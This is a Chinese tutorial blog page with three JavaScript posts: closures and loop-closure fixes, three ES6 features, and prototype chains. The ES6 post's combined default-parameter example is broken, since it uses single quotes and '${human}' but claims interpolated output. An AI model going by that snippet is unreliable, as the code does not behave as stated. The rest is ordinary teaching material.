<p>简单来说，在JavaScript中，函数是对象，对象是属性的集合，属性的值也可以是对象，在函数内定义函数就成为一种常见的情况，在函数内部声明函数innerFunction，在innerFunction内部有权访问外部函数的变量对象，这个函数就是我们所说的闭包。</p>
<p>我们来看一个简单的例子：<br><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkScope</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> scope = <span class="string">"local scope"</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">f</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> scope; &#125;</span><br><span class="line">    <span class="keyword">return</span> f();</span><br><span class="line">&#125;</span><br><span class="line">checkScope();<span class="comment">//输出为“local scope”</span></span><br></pre></td></tr></table></figure></p>
<p>当函数第一次被调用时，会创建一个执行环境以及相应的作用域链，作用域链的前端，始终都是当前执行代码所在环境的变量对象，作用域链中的下一个变量对象来自包含外部环境，下一个变量则来自下一个外部环境，这样一直延续到全局执行环境。</p>
<p>在上边的例子中，访问scope时，内部的f()函数可以访问f()外部的变量scope，因为它在作用域链中一级一级往上找的时候可以找到scope变量。</p>
<h2 id="闭包的作用"><a href="#闭包的作用" class="headerlink" title="闭包的作用"></a>闭包的作用</h2><p>一、 模拟私有变量。在函数内创建一个闭包，闭包就可以通过自己的作用域链访问函数内部的变量，可以创建用于访问私有变量的方法。访问私有变量和私有函数的方法被称为特权方法。</p>
<figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">MyObject</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> privateVariable = <span class="number">10</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">privateFunction</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//特权方法</span></span><br><span class="line">    <span class="keyword">this</span>.publicFunction = <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        privateVariable++;</span><br><span class="line">        <span class="keyword">return</span> privateFunction();</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>二、 模仿块级作用域。<br>JavaScript中没有块级作用域的概念，这意味着在块语句中定义的变量，实际上是包含在函数中的。如果临时需要一些变量，使用私有作用域。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">block</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> a = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">var</span> b = <span class="number">2</span>;</span><br><span class="line">    (<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> a = <span class="number">3</span>;<span class="comment">//覆盖了父作用域中的变量a</span></span><br><span class="line">        <span class="keyword">var</span> c = <span class="number">4</span>;</span><br><span class="line">        <span class="comment">//访问到了当前作用域中的变量</span></span><br><span class="line">        <span class="built_in">console</span>.log(a);<span class="comment">//3</span></span><br><span class="line">        <span class="comment">//访问了父作用域中的变量</span></span><br><span class="line">        <span class="built_in">console</span>.log(b);<span class="comment">//2</span></span><br><span class="line">        <span class="comment">//访问当前作用域中的变量</span></span><br><span class="line">        <span class="built_in">console</span>.log(c);<span class="comment">//4</span></span><br><span class="line">    &#125;)()</span><br><span class="line">    <span class="comment">//访问块级作用域中的变量</span></span><br><span class="line">    <span class="built_in">console</span>.log(c);<span class="comment">//c is not defined</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这种技术经常在全局作用域中被用在函数外部，从而限制向全局作用域中添加过多的变量和函数。</p>
<h2 id="循环中的闭包"><a href="#循环中的闭包" class="headerlink" title="循环中的闭包"></a>循环中的闭包</h2><p>使用闭包时一种常见的错误情况是循环中的闭包，很多初学者都遇到了这个问题。很常见的一种情况就是给页面中的多个按钮绑定点击事件，JavaScript代码如下所示：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> inputs = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'input'</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; inputs.length; i++)&#123;</span><br><span class="line">        inputs[i].onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(i);<span class="comment">//希望输出0,1,2,3,4...</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>页面中有5个按钮，根据上边的代码，我们需要的是依次点击按钮时，控制台分别打印出0，1，2，3，4，而实际上，控制台打印出来的，如下图所示：</p>
<img src="/2016/03/11/闭包简介/2017030601.png">
<p>这是为什么呢，当for循环执行完之后，i已经变成了按钮的个数5了，而所有点击函数绑定的都是同一个i，点击按钮时，打印出来的i也都变成了5了。</p>
<p>这一部分理解也可以参考<a href="http://www.cnblogs.com/qieguo/p/5457040.html。" target="_blank" rel="noopener">http://www.cnblogs.com/qieguo/p/5457040.html。</a></p>
<p>那么我们为了得到想要的结果，需要在每次循环中创建变量i的拷贝，下面提供三种方法。</p>
<p>第一、使用匿名包装器</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> inputs = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'input'</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; inputs.length; i++) &#123;</span><br><span class="line">        (<span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">            inputs[i].onclick = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)(i);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>依次点击按钮，控制台输出如下：</p>
<img src="/2016/03/11/闭包简介/2017030602.png">
<p>第二、从匿名包装器中返回一个函数：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> inputs = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'input'</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; inputs.length; i++) &#123;</span><br><span class="line">        inputs[i].onclick = <span class="function"><span class="keyword">function</span> (<span class="params">num</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(num);</span><br><span class="line">            &#125;;</span><br><span class="line">        &#125; (i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>首先，定义了匿名函数，并将立即执行该匿名函数的结果赋值给数组，匿名函数有一个参数num，在调用每个函数时，我们传入了变量i，函数按值传递，就将变量i的当前值复制给参数num。而在这个匿名函数内部，又创建并返回了一个访问num的闭包，这样一来，每个按钮点击函数都有自己num变量的一个副本，因此可以输出各自不同的数值了。</p>
<p>第三、在循环中使用let</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> inputs = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'input'</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; inputs.length; i++) &#123;</span><br><span class="line">        inputs[i].onclick = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(i);</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>let是ES6新增的命令，用法类似于var，但是所声明的变量只能在let命令所在代码块内有效。上述代码中，变量i是let声明的，当前的i只在本轮循环有效。所以每一次循环的i其实都是一个新的变量。关于let的用法可参考<a href="http://es6.ruanyifeng.com/#docs/let" target="_blank" rel="noopener">《ECMAScript 6 入门》中第二章</a>。</p>
<h2 id="内存泄漏"><a href="#内存泄漏" class="headerlink" title="内存泄漏"></a>内存泄漏</h2><p>产生内存泄漏的原因是IE9之前的版本对JScript对象和COM对象使用不同的垃圾收集例程，因此闭包在IE的这些版本中会导致一些问题。(JavaScript垃圾收集机制可参考《JavaScript高级程序设计(第3版)》4.3)<br>例如：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">assignHandle</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> element = <span class="built_in">document</span>.getElementById(<span class="string">'elementId'</span>);</span><br><span class="line">    element.onclick = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;  <span class="comment">// element的onclick引用了函数funciton，function通过闭包引用了element，造成循环引用</span></span><br><span class="line">        <span class="built_in">console</span>.log(element.id);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这个例子中，循环引用导致了element引用数至少为1，element所占内存就永远不会被回收，从而导致了内存泄漏问题。要解决这个问题，就需要解除对DOM对象的引用，减少引用数，确保正常回收其所占用的内存。</p>
<blockquote>
<p>引用计数的含义是跟踪记录每个值被引用的次数。当声明了一个变量并将一个引用类型值赋给该变量时，则这个值的引用次数就是1。如果同一个值又被赋给另一个变量，则该值的引用次数加1。相反，如果包含对这个值引用的变量又取得了另外一个值，则这个值的引用次数减1。当这个值的引用次数变成0时，则说明没有办法再次访问这个值了，因而就可以将其占用的内存空间回收回来。</p>
</blockquote>
<p>在采用引用计数策略的实现中，出现循环引用时，由于变量的引用次数永远不会是0，函数被多次调用时，就会导致大量内存得不到回收。<br>这一部分理解可以参考<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Memory_Management" target="_blank" rel="noopener">MDN中JavaScript内存管理</a>。</p>
<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>JavaScript闭包是极其有用的特性，但是由于闭包会携带包含它的函数的作用域，占用更多内存，过多使用闭包可能会导致内存占用过多。  </p>

      
    </div>
    <footer class="article-footer">
      

      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CSS/">CSS</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/JavaScript/">JavaScript</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/前端/">前端</a></li></ul>

    </footer>
  </div>
  
</article>

<!-- Table of Contents -->

  
    <article id="javascript-ES6"  class="article article-type-javascript" itemscope itemprop="blogPost" >
  <div id="articleInner" class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      <a class="article-title" href="/2016/03/09/ES6/">ES6</a>
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	<a href="/2016/03/09/ES6/" class="article-date">
	  <time datetime="2016-03-09T06:21:52.000Z" itemprop="datePublished">2016-03-09</time>
	</a>

      
      
    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <p>近年来，随着JavaScript社区的不断发展，JavaScript语言有了很多新的特性。其中的一个好的方面就是通过Node.js渗透了服务端开发，这可以让JavaScript开发者更为强大。</p>
<p>今天，我希望讨论的是ECMA2015（ES6）规范中的三个特性，希望可以让你开始使用ES6。</p>
<p>本文不是ES6特性的详细介绍指南，它是对这些特性的书面介绍。因此，本文不会深入介绍这些特性，也不会列出每个特性的优点与缺点。</p>
<h2 id="箭头函数"><a href="#箭头函数" class="headerlink" title="箭头函数"></a>箭头函数</h2><p>作为一个JavaScript开发人员，你一定知道原来的函数声明方式。</p>
<p>下面是一个简单的例子，它将时间戳转换成可读的形式。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dateFromTimeStamp</span>(<span class="params">timeStamp</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> humanReadableDate = <span class="keyword">new</span> <span class="built_in">Date</span>(timeStamp);</span><br><span class="line">    <span class="keyword">return</span> humanReadableDate;</span><br><span class="line">&#125;</span><br><span class="line">dateFromTimeStamp(<span class="number">1489957823485</span>); <span class="comment">////Sun Mar 19 2017 22:10:23 GMT+0100 (WAT)</span></span><br></pre></td></tr></table></figure>
<p>ES2015中</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> dateFromTimeStamp = <span class="function"><span class="params">timeStamp</span> =&gt;</span> <span class="keyword">new</span> <span class="built_in">Date</span>(timeStamp);</span><br><span class="line">dateFromTimeStamp(<span class="number">1489957823485</span>); <span class="comment">////Sun Mar 19 2017 22:10:23 GMT+0100 (WAT)</span></span><br></pre></td></tr></table></figure>
<p>你可以点击<a href="http://wesbos.com/arrow-functions/" target="_blank" rel="noopener">这里</a>学习更多关于箭头函数的内容。</p>
<h2 id="模板字符串"><a href="#模板字符串" class="headerlink" title="模板字符串"></a>模板字符串</h2><p>对我而言，这是一个最重要的特征，它使得我的字符串更易理解和接受。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> friendOne = <span class="string">'Smith'</span>;</span><br><span class="line"><span class="keyword">var</span> friendTwo = <span class="string">'Olawale'</span>;</span><br><span class="line"><span class="keyword">var</span> friendThree = <span class="string">'Victor'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> allOfThem = <span class="string">'The three friends are '</span> + friendOne + <span class="string">', '</span> + friendTwo + <span class="string">', and'</span> + friendThree; </span><br><span class="line"><span class="comment">//Output:  'The three friends are Smith, Olawale, andVictor'</span></span><br></pre></td></tr></table></figure>
<p>ES2015中</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> friendOne = <span class="string">'Smith'</span>;</span><br><span class="line"><span class="keyword">var</span> friendTwo = <span class="string">'Olawale'</span>;</span><br><span class="line"><span class="keyword">var</span> friendThree = <span class="string">'Victor'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> allOfThem = <span class="string">`The three friends are <span class="subst">$&#123;friendOne&#125;</span>, <span class="subst">$&#123;friendTwo&#125;</span> and <span class="subst">$&#123;friendThree&#125;</span>`</span>;</span><br><span class="line"><span class="comment">//Output:  'The three friends are Smith, Olawale and Victor'</span></span><br></pre></td></tr></table></figure>
<p>从上边这个例子可以看出，使用ES6模板字符串让编码更轻松，代码更简洁。我相信我不是唯一一个认为旧的解决方案像是hack。另一个好处是，模板支持多行文字，你可以写多行字符串，如果你换行，JavaScript会自动加上\n。<br>例如：</p>
<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> author = <span class="string">'Olawale'</span>;</span><br><span class="line"><span class="keyword">var</span> poem = `</span><br><span class="line">I am $&#123;author&#125;, <span class="keyword">this</span> <span class="keyword">is</span> my poem</span><br><span class="line">There isn<span class="string">'t much to say</span></span><br><span class="line"><span class="string">And here is my last line</span></span><br><span class="line"><span class="string">`;</span></span><br><span class="line"><span class="string">//Output: '</span><span class="string">\nI</span> am Olawale, <span class="keyword">this</span> <span class="keyword">is</span> my poem<span class="string">\nThere</span> isn<span class="string">\'t</span> much <span class="keyword">to</span> say<span class="string">\nAnd</span> here <span class="keyword">is</span> my last line<span class="string">\n'</span></span><br></pre></td></tr></table></figure>
<p>你可以点击<a href="http://exploringjs.com/es6/ch_template-literals.html" target="_blank" rel="noopener">这里</a>学习更多关于模板字符串的内容。</p>
<h2 id="默认参数"><a href="#默认参数" class="headerlink" title="默认参数"></a>默认参数</h2><p>在ES2015之前，如果你想要在函数中指定默认参数，你必须像在下边这个例子中这样：</p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title">greetHuman</span>(name) &#123;</span><br><span class="line">name = name || 'human';</span><br><span class="line"><span class="keyword">return</span> <span class="type">'Hello</span> ' + name + ', we come <span class="keyword">in</span> peace'; </span><br><span class="line">&#125;</span><br><span class="line">greetHuman(); // <span class="symbol">'Hello</span> human, we come <span class="keyword">in</span> peace'</span><br><span class="line">greetHuman(<span class="symbol">'Olawale</span>'); // <span class="symbol">'Hello</span> Olawale, we come <span class="keyword">in</span> peace'</span><br></pre></td></tr></table></figure>
<p>通过ES6，你可以再函数头处实现，不需要在函数体内检查参数。</p>
<p>让我们来看下面这个例子，这个例子用到了箭头函数、模板字符串和默认参数：</p>
<figure class="highlight sml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">const greetHuman = (name = <span class="symbol">'human'</span>) =&gt; <span class="symbol">'Hello</span> $&#123;human&#125;, we come <span class="keyword">in</span> peace';</span><br><span class="line">greetHuman(<span class="symbol">'Olawale'</span>); <span class="symbol">'Hello</span> <span class="type">Olawale</span>, we come <span class="keyword">in</span> peace'</span><br><span class="line">greetHuman<span class="literal">()</span>; <span class="symbol">'Hello</span> human, we come <span class="keyword">in</span> peace'</span><br></pre></td></tr></table></figure>
<p>你可以点击<a href="http://exploringjs.com/es6/" target="_blank" rel="noopener">这里</a>学习更多的ES6特性。以下是其他的学习ECMA(ES6)的资源：</p>
<ul>
<li><a href="https://www.codementor.io/javascript/tutorial/learn-ecmascript6" target="_blank" rel="noopener">How to Get Started with learning ES6</a></li>
<li><a href="https://www.codementor.io/javascript/tutorial/qa-es6-vs-typescript-debugging-workflow" target="_blank" rel="noopener">Introduction to ES6</a></li>
<li><a href="https://www.codementor.io/johnnyb/javascript-cheatsheet-fb54lz08k" target="_blank" rel="noopener">The Ultimate JavaScript Cheat Sheet</a></li>
</ul>
<p>原文链接：<a href="https://www.codementor.io/brainyfarm/javascript-es6-3-cool-features-you-should-be-using-6bntdqk5p" target="_blank" rel="noopener">Javascript ES6: 3 Cool Features You Should Be Using</a></p>

      
    </div>
    <footer class="article-footer">
      

      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CSS/">CSS</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ES6/">ES6</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/JavaScript/">JavaScript</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/前端/">前端</a></li></ul>

    </footer>
  </div>
  
</article>

<!-- Table of Contents -->

  
    <article id="post-JavaScript原型"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      <a class="article-title" href="/2016/03/09/JavaScript原型/">JavaScript原型</a>
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	<a href="/2016/03/09/JavaScript原型/" class="article-date">
	  <time datetime="2016-03-09T06:18:34.000Z" itemprop="datePublished">2016-03-09</time>
	</a>

      
      
    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="JavaScript原型"><a href="#JavaScript原型" class="headerlink" title="JavaScript原型"></a>JavaScript原型</h1><p>每一个JavaScript对象(null除外)都和另一个对象相关联，“另一个”对象就是我们熟知的原型，每一个对象都从原型继承属性。</p>
<p>所有通过对象直接创建的对象都具有同一个原型对象，并可以通过JavaScript代码Object.prototype获得原型对象引用。通过关键字new和构造函数调用创建的对象的原型就是构造函数的prototype属性的值。</p>
<p>没有原型的对象为数不多，Object.prototype就是其中之一，不继承任何属性。其他原型对象都是普通对象，普通对象都有原型。所有内置构造函数（以及大部分自定义的构造函数）都具有一个继承自Object.prototype的原型。例如：使用{}创建对象、通过new Object()创建的对象都继承自Object.prototype。同样，通过new Array()创建的对象的原型就是Array.prototype，通过new Date()创建的对象原型就是Date.prototype。</p>
<h2 id="原型链"><a href="#原型链" class="headerlink" title="原型链"></a>原型链</h2><p>由new Date()创建的Date对象的属性同时继承自Date.prototype和Object.prototype。这一系列链接的原型对象就是所谓的“原型链”。</p>
<p>JavaScript对象具有“自有属性”，也有一些属性是从原型对象继承而来的。我们来看一个简单的例子。</p>
<figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> o=&#123;x:<span class="number">1</span>&#125;;</span><br><span class="line"><span class="comment">//Object.create()方法使用指定的原型对象和属性创建了一个新的对象</span></span><br><span class="line"><span class="keyword">var</span> p=<span class="built_in">Object</span>.create(o);</span><br><span class="line">p.y=<span class="number">2</span>;</span><br><span class="line"><span class="keyword">var</span> q=<span class="built_in">Object</span>.create(p);</span><br><span class="line">q.z=<span class="number">3</span>;</span><br><span class="line">q.x+q.y <span class="comment">//=3</span></span><br></pre></td></tr></table></figure>
<p>为对象q的属性z赋值时，如果q中存在z属性（这个属性不是继承来的），这个赋值操作只会改变这个已有属性z的值，如果q中不存在属性z，将给q添加一个新的属性z，如果<br>q已经继承了属性z，那就这个继承的属性会被新创建的同名属性覆盖了。</p>
<p>在查询对象q上的属性时，首先判断q中是否存在属性，例如，在查询属性z时，首先判断对象q是否存在属性z，存在则返回属性z的值3，查询属性x时，在对象q中找不到属性x，就在它的原型链上寻找，在o中找到了属性x，并返回x的值，查询y属性时，在原型链中的p对象上找到了属性y，返回y的值，可以计算出q.x+q.y=3。</p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">o.r=<span class="number">4</span><span class="comment">;</span></span><br><span class="line">q.r<span class="comment">;//=&gt;4</span></span><br></pre></td></tr></table></figure>
<p>上边这个例子，我们可以看出原型的继承是动态的，创建了q对象之后，我们为o对象添加了新的属性，我们可以在q中访问到这个新的属性r。</p>
<h2 id="利用原型创建自定义类型"><a href="#利用原型创建自定义类型" class="headerlink" title="利用原型创建自定义类型"></a>利用原型创建自定义类型</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Book</span>(<span class="params">name,writer,price</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.name=name;</span><br><span class="line">    <span class="keyword">this</span>.writer=writer;</span><br><span class="line">    <span class="keyword">this</span>.price=price;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Book.prototype=&#123;</span><br><span class="line">    <span class="keyword">constructor</span>:Book,</span><br><span class="line">    sayBook:function()&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"BookName："</span>+<span class="keyword">this</span>.name+<span class="string">"，BookWriter："</span>+<span class="keyword">this</span>.writer+<span class="string">"，BookPrice："</span>+<span class="keyword">this</span>.price+<span class="string">"元"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> book1=<span class="keyword">new</span> Book(<span class="string">"book1"</span>,<span class="string">"Tom"</span>,<span class="string">"59.9"</span>);</span><br><span class="line">book1.sayBook();<span class="comment">//BookName：book1，BookWriter：Tom，BookPrice：59.9元</span></span><br></pre></td></tr></table></figure>
<p>在这个例子中，实例属性是在构造函数中定义的，而所有实例所共享的constructor和sayBook()方法是在原型中定义的。</p>
<p>以下是这个例子的原型图：<br><img src="/2016/03/09/JavaScript原型/2017-3-30-prototypeChain.png"></p>
<p>注：constructor属性，每个JavaScript函数都拥有一个prototype属性，这个属性的值是一个对象，这个对象包含唯一一个不可枚举的属性constructor,对象继承的constructor指代它们的构造函数。</p>

      
    </div>
    <footer class="article-footer">
      

      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CSS/">CSS</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/JavaScript/">JavaScript</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/前端/">前端</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/原型链/">原型链</a></li></ul>

    </footer>
  </div>
  
</article>

<!-- Table of Contents -->

  


  <nav id="page-nav">
    
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">weiter &raquo;</a>
  </nav>

</section>
        
      </div>
      
        <div align="center" style="margin-top: 30px;"><hr class="hr" style="margin:0px; height:3px;"></div>
      
      <footer id="footer">
  

  <div class="container">
      	<div class="row">
	      <p> Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/JoeJoeyMa/JoeJoeyMa.github.io" target="_blank">Hexo-theme-Joejoey</a> </p>
	      <p id="copyRightEn">Copyright &copy; 2013 - 2018 To change is to be better to change often is to change perfect All Rights Reserved.</p>
	      
	      
    		<p class="busuanzi_uv">
				UV : <span id="busuanzi_value_site_uv"></span> |  
				PV : <span id="busuanzi_value_site_pv"></span>
		    </p>
  		   
		</div>

		
  </div>
</footer>


<!-- min height -->

<script>
    var wrapdiv = document.getElementById("wrap");
    var contentdiv = document.getElementById("content");
    var allheader = document.getElementById("allheader");

    wrapdiv.style.minHeight = document.body.offsetHeight + "px";
    if (allheader != null) {
      contentdiv.style.minHeight = document.body.offsetHeight - allheader.offsetHeight - document.getElementById("footer").offsetHeight + "px";
    } else {
      contentdiv.style.minHeight = document.body.offsetHeight - document.getElementById("footer").offsetHeight + "px";
    }
</script>
    </div>
    <!-- <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
    <a href="/categories" class="mobile-nav-link">About themes</a>
  
    <a href="/tags" class="mobile-nav-link">Tags</a>
  
    <a href="/about" class="mobile-nav-link">About</a>
  
    <a href="/book" class="mobile-nav-link">📓</a>
  
</nav> -->
    

<!-- mathjax config similar to math.stackexchange -->

<script type="text/x-mathjax-config">
  MathJax.Hub.Config({
    tex2jax: {
